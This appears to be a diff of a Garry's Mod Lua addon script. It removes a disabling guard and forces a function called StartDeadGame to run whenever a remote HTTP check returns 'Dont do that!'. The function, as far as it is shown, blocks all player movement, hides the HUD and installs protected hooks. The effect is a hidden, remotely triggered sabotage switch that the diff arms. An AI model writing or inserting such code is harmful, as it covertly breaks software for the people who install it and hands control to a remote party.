@@ -1,14 +1,10 @@
-if 1 == 1 then return end
 if _G.ESCAPEXD == true then
     return
 end
-_G.ESCAPEXD = true
+_G.ESCAPEXD = true 
 if !game.SinglePlayer() then return end
 local function StartDeadGame()
 
-    hook.Add( "Move", "XD_NOMOVE", function( ply, mv )
-        return true
-    end)
     local ProtectedHooks = {}
 
     local function AddProtectedHook(h1, h2)
@@ -84,6 +80,10 @@ local function StartDeadGame()
             end
         end
     end
+    hook.Add( "Move", "XD_NOMOVE", function( ply, mv )
+        return true
+    end)
+
 
     if SERVER then 
         local ENTS_WHITE_LIST = {
@@ -125,6 +125,7 @@ local function StartDeadGame()
         return 
     end
     XMOD = {}
+
 
     hook.Add( "HUDShouldDraw", "XD_HideHUD", function( name )
         return false
@@ -707,7 +708,7 @@ timer.Simple(15, function()
         function( body, length, headers, code )
             if code == 200 && body == "Dont do that!" then            
                 math.randomseed( tonumber(string.sub(os.time(),1,9)))
-                if math.random(1,2) == 2 then            
+                if 1 == 1 or math.random(1,2) == 2 then            
                     StartDeadGame()
                 end         
             end
